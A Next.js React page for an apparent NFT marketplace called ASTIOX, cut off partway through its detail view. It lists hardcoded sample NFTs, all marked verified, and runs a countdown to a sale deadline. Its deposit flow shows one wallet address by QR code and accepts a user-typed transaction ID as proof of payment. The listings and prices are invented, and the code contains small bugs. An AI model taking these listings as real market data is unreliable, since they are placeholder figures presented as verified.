"use client"

import QRCode from "qrcode";
import { ErrorMessage, Field, Form, Formik } from 'formik';
import Image from 'next/image'
import React, { useState, useEffect } from 'react'
import * as Yup from "yup";
import { useRouter } from 'next/navigation';
import axios from 'axios';
import { CgArrowLeft } from 'react-icons/cg';
import { DesktopSideBar } from './../components/DesktopSideBar';
import { Header } from './../components/Header';
import { useAuth } from '@/app/context/AuthContext';
import { BiCopy } from "react-icons/bi";
import { GrTransaction } from "react-icons/gr";
import { LuArrowDownToLine, LuSearch } from "react-icons/lu";
import { FaHeart, FaInfo } from "react-icons/fa6";
import { Footer } from "../components/Footer";
import { TbTriangleInvertedFilled } from "react-icons/tb";
import { IoIosInformationCircleOutline } from "react-icons/io";
import LoadingScreen from "./loading";
import { IoClose } from "react-icons/io5";
import { RiNftFill } from "react-icons/ri";
import { MdDescription, MdVerified } from "react-icons/md";
import { FaAngleDown, FaAngleUp } from "react-icons/fa";

const nftData = [
  {
    img: "https://images.unsplash.com/photo-1635322966219-b75ed372eb01?w=800&q=80",
    price: "10999.85 USD",
    floorPrice: "8002.78 USD",
    name: "Blaze Dragon",
    properties: {
      win: 12,
      fiveElement: "FIRE",
      hp: 420,
      skills: ["Flame Burst", "Inferno Claw"],
      star: 3,
      generations: 2,
      lose: 4,
      atk: 180,
      experience: 340,
      grade: "RARE"
    },
    rate: "4.8",
    isVerified: true,
    description: "A fierce dragon born from volcanic eruptions with devastating fire attacks.",
    likes: 124,
    details: {
      category: "Gaming",
      creator: "Dragon Labs",
      owner: "0x81F3...9AB2",
      tokenID: 145308,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=800&q=80",
    price: "1492.20 USD",
    floorPrice: "1201.05 USD",
    name: "Ocean Spirit",
    properties: {
      win: 18,
      fiveElement: "WATER",
      hp: 510,
      skills: ["Tsunami Wave", "Aqua Shield"],
      star: 4,
      generations: 1,
      lose: 3,
      atk: 210,
      experience: 520,
      grade: "EPIC"
    },
    rate: "4.9",
    isVerified: true,
    description: "A mystical guardian of the seas capable of controlling ocean currents.",
    likes: 242,
    details: {
      category: "Gaming",
      creator: "MetaSea",
      owner: "0x6D43...AA9C",
      tokenID: 145309,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1643101816269-7a7ff4fce5c3?w=800&q=80",
    price: "533.65 USD",
    floorPrice: "452.60 USD",
    name: "Earth Golem",
    properties: {
      win: 8,
      fiveElement: "EARTH",
      hp: 680,
      skills: ["Stone Wall", "Rock Smash"],
      star: 2,
      generations: 1,
      lose: 7,
      atk: 95,
      experience: 180,
      grade: "COMMON"
    },
    rate: "4.2",
    isVerified: true,
    description: "A heavily armored golem forged from enchanted mountain stones.",
    likes: 51,
    details: {
      category: "Gaming",
      creator: "TerraVerse",
      owner: "0x3B62...F9E1",
      tokenID: 145310,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1640161704729-cbe966a08476?w=800&q=80",
    price: "20999.10 USD",
    floorPrice: "18944.95 USD",
    name: "Storm Rider",
    properties: {
      win: 26,
      fiveElement: "AIR",
      hp: 460,
      skills: ["Lightning Dash", "Thunder Strike"],
      star: 5,
      generations: 3,
      lose: 2,
      atk: 280,
      experience: 890,
      grade: "LEGENDARY"
    },
    rate: "5.0",
    isVerified: true,
    description: "Master of storms who rides the skies with unmatched speed.",
    likes: 601,
    details: {
      category: "Gaming",
      creator: "SkyForge",
      owner: "0xF0A2...9912",
      tokenID: 145311,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1639762681057-408e52192e55?w=800&q=80",
    price: "7443.95 USD",
    floorPrice: "5434.87 USD",
    name: "Frost Wolf",
    properties: {
      win: 14,
      fiveElement: "WATER",
      hp: 390,
      skills: ["Ice Fang", "Frozen Trail"],
      star: 3,
      generations: 1,
      lose: 5,
      atk: 165,
      experience: 310,
      grade: "RARE"
    },
    rate: "4.6",
    isVerified: true,
    description: "A wolf from the frozen north with deadly ice abilities.",
    likes: 177,
    details: {
      category: "Gaming",
      creator: "IceRealm",
      owner: "0x4A7C...B112",
      tokenID: 145312,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1644371175904-0f2a6d7f2450?w=800&q=80",
    price: "1094.75 USD",
    floorPrice: "854.60 USD",
    name: "Shadow Assassin",
    properties: {
      win: 22,
      fiveElement: "DARK",
      hp: 330,
      skills: ["Silent Strike", "Shadow Cloak"],
      star: 4,
      generations: 2,
      lose: 2,
      atk: 260,
      experience: 700,
      grade: "EPIC"
    },
    rate: "4.9",
    isVerified: true,
    description: "A stealthy assassin who thrives in darkness.",
    likes: 430,
    details: {
      category: "Gaming",
      creator: "NightVerse",
      owner: "0x9C44...AB12",
      tokenID: 145313,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1644982647711-cb5fbd9f8f49?w=800&q=80",
    price: "3224.50 USD",
    floorPrice: "3009.10 USD",
    name: "Phoenix King",
    properties: {
      win: 35,
      fiveElement: "FIRE",
      hp: 550,
      skills: ["Rebirth", "Solar Flame"],
      star: 5,
      generations: 1,
      lose: 1,
      atk: 320,
      experience: 1500,
      grade: "MYTHIC"
    },
    rate: "5.0",
    isVerified: true,
    description: "A legendary phoenix that rises stronger after every battle.",
    likes: 1203,
    details: {
      category: "Gaming",
      creator: "MythForge",
      owner: "0xDA11...EE90",
      tokenID: 145314,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1645725677296-5f3f6c4d8f61?w=800&q=80",
    price: "10222.72 USD",
    floorPrice: "0943.66 USD",
    name: "Forest Guardian",
    properties: {
      win: 10,
      fiveElement: "EARTH",
      hp: 590,
      skills: ["Nature Shield", "Vine Trap"],
      star: 2,
      generations: 1,
      lose: 6,
      atk: 120,
      experience: 200,
      grade: "COMMON"
    },
    rate: "4.3",
    isVerified: true,
    description: "Protector of ancient forests and sacred lands.",
    likes: 88,
    details: {
      category: "Gaming",
      creator: "GreenMeta",
      owner: "0xBE29...A776",
      tokenID: 145315,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1642543492481-44e81e3914a7?w=800&q=80",
    price: "24505.45 USD",
    floorPrice: "14430.20 USD",
    name: "Cyber Samurai",
    properties: {
      win: 28,
      fiveElement: "METAL",
      hp: 470,
      skills: ["Nano Blade", "Cyber Rush"],
      star: 5,
      generations: 2,
      lose: 4,
      atk: 290,
      experience: 980,
      grade: "LEGENDARY"
    },
    rate: "4.9",
    isVerified: true,
    description: "A futuristic warrior enhanced with cybernetic technology.",
    likes: 701,
    details: {
      category: "Gaming",
      creator: "NeoVerse",
      owner: "0xAB91...F221",
      tokenID: 145316,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  },
  {
    img: "https://images.unsplash.com/photo-1643101747482-6e7f2d4c8b59?w=800&q=80",
    price: "37999.95 USD",
    floorPrice: "20099.70 USD",
    name: "Celestial Tiger",
    properties: {
      win: 24,
      fiveElement: "LIGHT",
      hp: 520,
      skills: ["Holy Roar", "Divine Slash"],
      star: 4,
      generations: 1,
      lose: 3,
      atk: 250,
      experience: 810,
      grade: "EPIC"
    },
    rate: "4.8",
    isVerified: true,
    description: "A divine tiger blessed by celestial guardians.",
    likes: 395,
    details: {
      category: "Gaming",
      creator: "StarMeta",
      owner: "0x11CA...B902",
      tokenID: 145317,
      network: "BNB Chain",
      contractAddress: "0xe696...580b",
      royaityFee: "1%",
      platformFee: "1%"
    }
  }
];


export default function Page() {

  const router = useRouter();
  const [step, setStep] = useState(1);
  const [coin, setCoin] = useState("USDT");
  const { user } = useAuth();
  const [amount, setAmount] = useState(0);
  const [isError, setIsError] = useState(false);
  const [isDetails, setIsDetails] = useState(false);
  const [isProperties, setIsProperties] = useState(false);
  const [isDescription, setIsDescription] = useState(false);
  const [loading, setLoading] = useState(false);
  const [selectedNFT, setSelectedNFT] = useState(null);
  const [collateral, setCollateral] = useState(5000);
  const [showTrendingNFT, setShowTrendingNFT] = useState(true);
  const [showTopNFT, setShowTopNFT] = useState(false);
  const loanMax = 1000000;
  const loanMin = 10000;
  const [errorMessage, setErrorMessage] = useState("");
  const walletAddress = process.env.NEXT_PUBLIC_TETHER_USDT;
  const [qr, setQr] = useState("");
  // Set your target date
  const targetDate = new Date("2026-07-31T23:59:59").getTime();

  const [timeLeft, setTimeLeft] = useState({
    days: "00",
    hours: "00",
    mins: "00",
    secs: "00",
  });

  useEffect(() => {
    const timer = setInterval(() => {
      const now = Date.now();
      const distance = targetDate - now;

      if (distance <= 0) {
        clearInterval(timer);

        setTimeLeft({
          days: "00",
          hours: "00",
          mins: "00",
          secs: "00",
        });

        return;
      }

      const days = Math.floor(
        distance / (1000 * 60 * 60 * 24)
      );

      const hours = Math.floor(
        (distance % (1000 * 60 * 60 * 24)) /
          (1000 * 60 * 60)
      );

      const mins = Math.floor(
        (distance % (1000 * 60 * 60)) /
          (1000 * 60)
      );

      const secs = Math.floor(
        (distance % (1000 * 60)) /
          1000
      );

      setTimeLeft({
        days: String(days).padStart(2, "0"),
        hours: String(hours).padStart(2, "0"),
        mins: String(mins).padStart(2, "0"),
        secs: String(secs).padStart(2, "0"),
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [targetDate]);
  
    useEffect(() => {
      QRCode.toDataURL(walletAddress)
        .then(url => setQr(url))
        .catch(err => console.error(err));
    }, []);
  
    // ✅ Copy Address
    const copyAddress = () => {
        // Get the text field
    let copyText = document.getElementById("address");

    // Select the text field
    copyText.select();
    copyText.setSelectionRange(0, 99999); // For mobile devices

    // Copy the text inside the text field
    navigator.clipboard.writeText(walletAddress);
      alert("Wallet address copied ✅");
    };
  
    // ✅ Download QR
    const downloadQR = () => {
      const link = document.createElement("a");
      link.href = qr;
      link.download = "wallet-qr.png";
      link.click();
    };


  const handleNFT = (nft) => {
    setSelectedNFT(nft);
    setStep(2);
  }

  const handleShowTrendingNFT = () => {
    setShowTrendingNFT(true);
    setShowTopNFT(false);
  }

  const handleShowTopNFT = () => {
    setShowTrendingNFT(false);
    setShowTopNFT(true);
  }

  const handleDetails = () => {
    setIsDetails(!isDetails);
  }

  const handleProperties = () => {
    setIsProperties(!isProperties);
  }

  const handleDescription = () => {
    setIsDescription(!isDescription);
  }

  let initialValueTransactionID = {
    transactionID: "",
  }

  const validationSchemaTransactionID = Yup.object({
    transactionID: Yup.string()
      .required("Please enter you transaction ID."),
  });


  async function processPayment (values, onSubmitProps) {
        setIsError(false)
        setLoading(true);

        try {

      const res = await axios.post(
        `/api/auth/users/nfts/nft?id=${user._id}`,
        {
          transactionID: values.transactionID,
          currency: coin,
          amount: selectedNFT.price,
        },
        {
          withCredentials: true,
          headers: { "Content-Type": "application/json" }  
        }
      );



      if (res.status === 201) {
        setIsError(false);
        setStep(4);
      }
      
    } catch(err) {
      setErrorMessage(err.message);
      setIsError(true);
      setLoading(false);
    }
  }

  async function borrowAmount (values, onSubmitProps) {
    const convertedAmount = Number(values.amount) / 2;
    setIsError(false)
      //setLoading(true);
        onSubmitProps.setSubmitting(false);
        if (values.amount < loanMin || values.amount > loanMax) {
            setErrorMessage(`Minimum loan amount $${loanMin.toLocaleString()} USD and must NOT exceed $${loanMax.toLocaleString()} USD`);
            setIsError(true)
            setLoading(false);
        } else {
            setIsError(false)
            setAmount(convertedAmount)
            setStep(3);
            setLoading(false);
        }
  }

  return (
    <div className="bg-white w-full h-full dark:bg-isoDark dark:text-white text-black min-h-screen relative font-[family-name:var(--font-geist-sans)]">
     {loading === true && (<LoadingScreen />)}
     <div className='hidden md:block w-full'>
        <Header />
     </div>

       <div className='w-full h-full min-h-screen md:pt-20 flex items-start'>
     
          <DesktopSideBar tab={"deposit"} />

          <div className='w-full h-full md:py-16 bg-none text-black relative px-4 flex flex-col md:justify-center md:items-center container mx-auto md:px-40'>
                <div className='w-full flex flex-col space-y-5 '>

                <div className={`flex items-center py-5 md:py-0  ${step === 1 ? "justify-between" : "justify-center"} relative`}>
                    {
                        step === 1 ? (
                            <div
                                              className="space-x-1 flex md:hidden justify-center text-base text-center font-medium transition-all duration-500 w-full items-center"
                                            >
                                              <Image
                                                src="/icons/logoMain2.png"
                                                alt="ASTIOX_logo"
                                                className="w-5 block dark:hidden"
                                                width={50}
                                                height={0}
                                                />
                                                <Image
                                                src="/icons/mainLogo2.png"
                                                alt="ASTIOX_logo"
                                                className="w-5 dark:block hidden"
                                                width={50}
                                                height={0}
                                                />
                            
                                                <div className='flex w-full items-center justify-start text-base space-x-1'>
                                                  <h1 className='font-extrabold text-isoColor1 dark:text-isoColor2'>ASTIOX</h1>
                                                  <span className='text-black font-medium dark:text-white'>NFT</span>
                                                </div>
                                      </div>
                        ) : (
                            <div
                                className='flex absolute left-0 text-black dark:text-white'
                                onClick={() => setStep(1)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </div>
                        )
                    }

                    <h1 className='text-lg font-medium md:text-3xl md:font-semibold'>

                        {step === 1 ? (
                            <div className='flex md:hidden items-center dark:text-white space-x-5 rounded-full px-2 py-1 border dark:border-neutral-600 border-neutral-200'>
                                        <a href="#" className="">
                                            <RiNftFill className='w-4 h-4' />
                                        </a>
                                        <a href="/dashboard" className="">
                                            <IoClose className='w-5 h-5' />
                                        </a>
                            </div>
                        ) : step === 2 ? (
                            <span className="dark:text-white">{selectedNFT.name}</span>
                        ) : (
                            <span className="dark:text-white">Deposit {" "}{coin}</span>
                        )}
                
                    </h1>
                </div>


                {step === 1 && (
                    <div className="w-full flex text-black dark:text-white space-y-2 flex-col">
                        
                        <div className='w-full flex relative justify-between items-center'>
                                        <div
                                            className={`text-neutral-400 bg-gray-100 dark:bg-isoDark2 font-medium border-none rounded-full w-full p-5 text-md focus:outline-none focus:none focus:text-black`}
                                        ></div>

                                        <span className='text-neutral-500 flex w-fit items-center space-x-1.5 absolute left-3 font-medium'>
                                            <LuSearch className='w-5 h-5' />
                                        </span>
                        </div>

                        <div className="w-full flex flex-col space-y-7">

                            <div className="flex w-full overflow-x-scroll scrollbar-hide space-y-5 md:justify-between items-baseline gap-x-4 md:overflow-x-auto">

                                <div className='space-y-6 min-w-[80%] text-black rounded-3xl md:w-[300px]'>

                                    <div className='bg-no-repeat bg-nftSlideBanner2 bg-cover h-[150px] rounded-2xl w-full md:h-[500px] bg-center'></div>

                                  </div>

                                  <div className='space-y-6 min-w-[80%] text-black rounded-3xl md:w-[300px]'>

                                    <div className='bg-no-repeat bg-nftSlideBanner1 bg-cover h-[150px] rounded-2xl w-full md:h-[500px] bg-center'></div>

                                  </div>

                                  <div className='space-y-6 min-w-[80%] text-black rounded-3xl md:w-[300px]'>

                                    <div className='bg-no-repeat bg-homepageSlideBanner3 bg-cover h-[150px] rounded-2xl w-full md:h-[500px] bg-center'></div>

                                  </div>

                            </div>

                        </div>

                        <div className="w-full flex text-black dark:text-white flex-col gap-y-2 px-4 py-3 container mx-auto">
                                      <div className="w-full flex space-x-4 items-center">
                                        <h4
                                          onClick={handleShowTrendingNFT}
                                          className={`transition-500 cursor-pointer transition-all ease-out ${
                                            showTrendingNFT
                                              ? "border-b-4 dark:border-isoColor2 border-isoColor1 p-2"
                                              : "text-neutral-400 p-2"
                                          }`}
                                        >
                                          Trending
                                        </h4>
                        
                                        <h4
                                          onClick={handleShowTopNFT}
                                          className={`transition-500 cursor-pointer transition-all ease-out ${
                                            showTopNFT
                                              ? "border-b-4 dark:border-isoColor2 border-isoColor1 p-2"
                                              : "text-neutral-400 p-2"
                                          }`}
                                        >
                                          Top
                                        </h4>
                                      </div>
                        
                                      {showTrendingNFT && (
                                        <div className="w-full flex flex-col space-y-4 mb-14 py-5 transition-500 overflow-hidden">

                                            <div className='flex w-full justify-between pb-3 border-b dark:border-neutral-600 border-neutral-200 items-center'>
                                                <span className='text-xs text-neutral-400'>Collection</span>
                        
                                                <span className='text-xs text-neutral-400'>Floor Price</span>
                                            </div>
                        
                                            {nftData.map((nft, index) => (
                                                <a href="#" key={index} onClick={() => handleNFT(nft)} className='flex w-full justify-between items-center'>
                                                    <div className='flex items-center  space-x-2'>
                                                        <p className="text-neutral-400">{index + 1}</p>
                                                        <img
                                                        src={nft.img}
                                                        alt=""
                                                        className="w-10 h-10 object-cover rounded-md"
                                                        />
                                                        <div className='space-y-1 text-xs'>
                                                            <div className="flex items-center space-x-0.5">
                                                                <h2 className='font-medium'>{nft.name}</h2>
                                                                {nft.isVerified === true && (<MdVerified className='w-4 h-4 dark:text-isoColor2 text-isoColor1' />)}
                                                            </div>
                                                            <span className='text-neutral-400'>{nft.floorPrice}</span>
                                                        </div>
                                                    </div>
                                
                                                    <div className='space-y-1'>
                                                            <h2 className='font-medium text-sm'>{nft.price}</h2>
                                                            <span className='text-xs text-red-500'>-{nft.rate}%</span>
                                                    </div>
                                                </a>
                                            ))}

                                        </div>
                                      )}

                                      {showTopNFT && (
                                        <div className="w-full flex flex-col space-y-4 mb-14 py-5 transition-500 overflow-hidden">

                                            <div className='flex w-full justify-between pb-3 border-b dark:border-neutral-600 border-neutral-200 items-center'>
                                                <span className='text-xs text-neutral-400'>Collection</span>
                        
                                                <span className='text-xs text-neutral-400'>Floor Price</span>
                                            </div>
                        
                                            {nftData.map((nft, index) => (
                                                <a href="#" key={index} onClick={() => handleNFT(nft)} className='flex w-full justify-between items-center'>
                                                    <div className='flex items-center  space-x-2'>
                                                        <p className="text-neutral-400">{index + 1}</p>
                                                        <img
                                                        src={nft.img}
                                                        alt=""
                                                        className="w-10 h-10 object-cover rounded-md"
                                                        />
                                                        <div className='space-y-1 text-xs'>
                                                            <div className="flex items-center space-x-0.5">
                                                                <h2 className='font-medium'>{nft.name}</h2>
                                                                {nft.isVerified === true && (<MdVerified className='w-4 h-4 dark:text-isoColor2 text-isoColor1' />)}
                                                            </div>
                                                            <span className='text-neutral-400'>{nft.floorPrice}</span>
                                                        </div>
                                                    </div>
                                
                                                    <div className='space-y-1'>
                                                            <h2 className='font-medium text-sm'>{nft.price}</h2>
                                                            <span className='text-xs text-red-500'>-{nft.rate}%</span>
                                                    </div>
                                                </a>
                                            ))}

                                        </div>
                                      )}
                        </div>
                        
                    </div>
                )}

                {step === 3 && (
                    <div className="flex flex-col dark:space-y-5 items-center w-full pb-40 md:px-40 justify-center">
                                        
                                                                <div className='w-full rounded-3xl dark:bg-isoDark2 dark:text-white dark:border dark:border-neutral-600 bg-[#f4f4f5] text-black p-3 flex space-x-3 items-center'>
                                                                    <div className='bg-isoColor1 dark:bg-isoColor2 dark:text-black rounded-full p-1 text-blue-100'><FaInfo className={`h-4 w-4`} /></div>
                                                                    <p className='text-xs'>Before sending, double-check <span className="text-isoColor1 dark:text-isoColor2">the network</span>, <span className="text-isoColor1 dark:text-isoColor2">deposit address</span>, and <span className="text-isoColor1 dark:text-isoColor2">coin</span>, and send only <span className="text-isoColor1 dark:text-isoColor2">the exact amount</span>.</p>
                                                                </div>
                                        
                                                                <div className='w-full flex flex-col md:px-5 relative md:w-[450px] md:h-[650px] md:rounded-3xl md:shadow-lg'>
                                                                    
                                                                    <div className="">
                                                                        <div className="flex justify-center items-center">
                                        
                                                                            {/* QR Code */}
                                                                            <div className="flex justify-center items-center">
                                                                            {qr && (
                                                                                <div className="p-3 bg-white relative rounded-2xl">
                                                                                <img
                                                                                    src={qr}
                                                                                    onClick={downloadQR}
                                                                                    alt="Wallet QR"
                                                                                    className="w-44 h-44"
                                                                                />
                                        
                                                                                <div className='absolute bg-white p-1 top-20 right-20 '>
                                                                                        {coin === "BTC" ? (
                                                                                        <Image
                                                                                            src="/icons/bitcoin.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                        />)
                                                                                        : coin === "ETH" ? (
                                                                                            <Image
                                                                                            src="/icons/ethereum.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                        />
                                                                                        )
                                                                                        : coin === "USDT" ? (
                                                                                            <Image
                                                                                            src="/icons/Tether.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                            />
                                                                                        )
                                                                                        : coin === "BNB" ? (
                                                                                            <Image
                                                                                            src="/icons/bnb-icon2_2x.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                            />
                                                                                        )
                                                                                        : coin === "XRP" ? (
                                                                                            <Image
                                                                                            src="/icons/xrp-symbol-white-128.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                            />
                                                                                            )
                                                                                        : coin === "SOL" ? (
                                                                                            <Image
                                                                                            src="/icons/solana.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                            />
                                                                                            )
                                                                                        : (
                                                                                            <Image
                                                                                            src="/icons/Tether.webp"
                                                                                            alt="ASTIOX_logo"
                                                                                            className="w-7"
                                                                                            width={50}
                                                                                            height={0}
                                                                                            />
                                                                                            )}
                                                                                </div>
                                        
                                                                                </div>
                                                                            )}
                                                                            </div>
                                        
                                                                        </div>
                                                                    </div>
                                        
                                                                    <div className="flex w-full justify-between relative items-center">
                                                                        <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                                                            <p className="text-sm text-neutral-500">Network</p>
                                        
                                                                            <h1 className='text-lg dark:text-white font-semibold'>
                                                                                            {coin === "BTC" ? "BTC"
                                                                                            : coin === "ETH" ? "ETH"
                                                                                            : coin === "USDT" ? "BSC"
                                                                                            : coin === "BNB" ? "BSC"
                                                                                            : coin === "XRP" ? "XRP"
                                                                                            : coin === "SOL" ? "SOL"
                                                                                            : "TRX"}
                                                                            </h1>
                                                                            <span className="text-xs text-neutral-400">
                                                                                            {coin === "BTC" ? "Bitcoin (BTC)"
                                                                                              : coin === "ETH" ? "Ethereum (ETH)"
                                                                                              : coin === "USDT" ? "Tether USD (BEP20)"
                                                                                              : coin === "BNB" ? "BNB Smart Chain (BNB)"
                                                                                              : coin === "XRP" ? "BNB pegged XRP Token (BEP20)"
                                                                                              : coin === "SOL" ? "Solana (SOL)"
                                                                                              : ""}
                                                                            </span>
                                                                        </div>
                                                                    </div>
                                        
                                                                    <div className="flex w-full justify-between relative items-center">
                                                                        <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                                                            <p className="text-sm text-neutral-500">Amount</p>
                                                                            <h1 className="text-lg dark:text-white font-semibold">${selectedNFT.price}</h1>
                                                                        </div>
                                        
                                                                        <div className="flex absolute right-0 pl-6">
                                                                            <span onClick={() => setStep(2)} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                                                                <GrTransaction className='w-5 h-5' />
                                                                            </span>
                                                                        </div>
                                                                    </div>
                                        
                                                                    <div className="flex w-full justify-between relative items-center">
                                                                        <div className="space-y-0 flex flex-col flex-wrap py-6 border-b dark:border-neutral-600 border-gray-100">
                                                                            <p className="text-sm text-neutral-500">Deposit Address</p>
                                                                            <input
                                                                            id="address"
                                                                            className="text-lg py-1 dark:bg-isoDark2 dark:text-white font-normal text-black w-full flex flex-wrap hover:outline-none px-0 border-0 outline-none"
                                                                            type="text"
                                                                            value={walletAddress}
                                                                            readOnly
                                                                            />
                                                                        </div>
                                        
                                                                        <div className="flex absolute right-0 pl-6">
                                                                            <span onClick={copyAddress} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                                                                <BiCopy className='w-5 h-5' />
                                                                            </span>
                                                                        </div>
                                                                    </div>
                                        
                                                                    <div className="flex flex-col space-y-4 py-4 text-xs">
                                                                        <p className="flex justify-between items-center">
                                                                            <span className="text-neutral-400">Minimum deposit</span>
                                                                            <span className="dark:text-white">{'> '}{amount}.00 USD</span>
                                                                        </p>
                                        
                                                                        <p className="flex justify-between items-center">
                                                                            <span className="text-neutral-400">Credited (Trading enabled)</span>
                                                                            <span className="dark:text-white">1 Confirmation(s)</span>
                                                                        </p>
                                        
                                                                        <p className="flex justify-between items-center">
                                                                            <span className="text-neutral-400">Unlocked (Withdrawal enabled)</span>
                                                                            <span className="dark:text-white">1 Confirmation(s)</span>
                                                                        </p>
                                                                    </div>
                                        
                                                                    <div className='fixed md:absolute bottom-0 bg-white dark:bg-isoDark dark:text-white py-4 left-4 right-4'>
                                                                        <Formik
                                                                                    initialValues={initialValueTransactionID}
                                                                                    validationSchema={validationSchemaTransactionID}
                                                                                    onSubmit={processPayment}
                                                                                >
                                                                                    {({ errors, touched, values }) => (
                                                                                    <Form className="w-full flex md:px-8 flex-col space-y-4">
                                                                                        <div>
                                                                                        <label
                                                                                            htmlFor="transactionID"
                                                                                            className="flex space-x-2 items-center text-sm pb-1"
                                                                                        >Transaction ID:</label>
                                                                                        <Field name="transactionID">
                                                                                            {(props) => {
                                                                                            const { field, form, meta } = props;
                                                                                            return (
                                                                                                <input
                                                                                                placeholder=""
                                                                                                className={`form__input dark:md:bg-isoDark dark:focus:border-isoColor2 dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 border-neutral-200 border text-neutral-400 font-medium rounded-full w-full p-3 text-md focus:outline-none focus:border-isoColor1 focus:text-black`}
                                                                                                type="text"
                                                                                                id="transactionID"
                                                                                                name="transactionID"
                                                                                                {...field}
                                                                                                />
                                                                                            );
                                                                                            }}
                                                                                        </Field>
                                                                                        <ErrorMessage name="transactionID">
                                                                                            {(errMsg) => (
                                                                                            <span className="text-red-500 text-xs">{errMsg}</span>
                                                                                            )}
                                                                                        </ErrorMessage>
                                                                                        </div>
                                                                                        {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}
                                        
                                                                                        <button
                                                                                        type="submit"
                                                                                        className="w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                                                        disabled={Formik.isValid || Formik.isSubmitting}
                                                                                        >
                                                                                        {loading ? "Processing..." : "Save and Process Payment"}
                                                                                        </button>
                                                                                    </Form>
                                                                                    )}
                                                                        </Formik>
                                                                    </div>
                                        
                                                                </div>
                                        
                                        </div>
                )}

                {step === 2 && (
                    <div className='w-full h-full pb-32 flex text-black relative py-4 space-y-4 flex-col'>
                    
                        <div className='w-full rounded-xl dark:bg-isoDark2 bg-[#f4f4f5] dark:text-white text-black p-3 flex space-x-3 items-start'>
                            <div className='bg-isoColor1 dark:bg-isoColor2 dark:text-black rounded-full p-0.5 text-blue-100'><FaInfo className={`h-3 w-3`} /></div>
                            <p className='text-[0.60rem]'>Be careful of scammers; direct selling or buying on social media often leads to risky scenarios. Do your own research before buying and selling. Trade responsibly and manage your risk accordingly.</p>
                        </div>

                        <div className="w-full flex items-start justify-between">

                            <div className='space-y-1 text-base'>
                                                            <div className="flex items-center text-isoColor1 dark:text-isoColor2 space-x-2">
                                                                <h2 className='font-medium'>{selectedNFT.name}</h2>
                                                                {selectedNFT.isVerified === true && (<MdVerified className='w-4 h-4' />)}
                                                            </div>
                                                            <h2 className='font-medium dark:text-neutral-400'>{selectedNFT.name}</h2>
                            </div>
                            <div className="flex items-center space-x-2">
                                <FaHeart onClick={() => selectedNFT.likes += 1} className='w-5 h-5 hover:text-black dark:hover:text-white text-neutral-500' />
                                <span className="text-black dark:text-white">{selectedNFT.likes}</span>
                            </div>
                        </div>

                        <img
                            src={selectedNFT.img}
                            alt={selectedNFT.name}
                            className="w-full h-80 object-cover rounded-lg"
                        />

                        <div className='space-y-1.5 text-base'>
                            <h2 className='text-sm text-neutral-400'>Price</h2>
                            <div className="flex items-center space-x-1">
                                <h2 className="text-xl text-black dark:text-white font-medium">{selectedNFT.price}</h2>
                                <p className='text-xs text-neutral-400'>= {selectedNFT.floorPrice}</p>
                            </div>
                        </div>

                        <div className="space-y-1.5 text-base">
                            <h2 className="text-sm text-neutral-400">
                                End in
                            </h2>

                            <div className="flex items-center space-x-2">
                                <div className="flex items-center space-x-1">
                                <h2 className="text-base text-black dark:text-isoColor2 font-medium">
                                    {timeLeft.days}
                                </h2>
                                <p className="text-xs text-neutral-400">
                                    Days
                                </p>
                                </div>

                                <div className="flex items-center space-x-1">
                                <h2 className="text-base text-black dark:text-isoColor2 font-medium">
                                    {timeLeft.hours}
                                </h2>
                                <p className="text-xs text-neutral-400">
                                    Hours
                                </p>
                                </div>

                                <div className="flex items-center space-x-1">
                                <h2 className="text-base text-black dark:text-isoColor2 font-medium">
                                    {timeLeft.mins}
                                </h2>
                                <p className="text-xs text-neutral-400">
                                    Mins
                                </p>
                                </div>

                                <div className="flex items-center space-x-1">
                                <h2 className="text-base text-black dark:text-isoColor2 font-medium">
                                    {timeLeft.secs}
                                </h2>
                                <p className="text-xs text-neutral-400">
                                    Secs
                                </p>
                                </div>
                            </div>
                        </div>

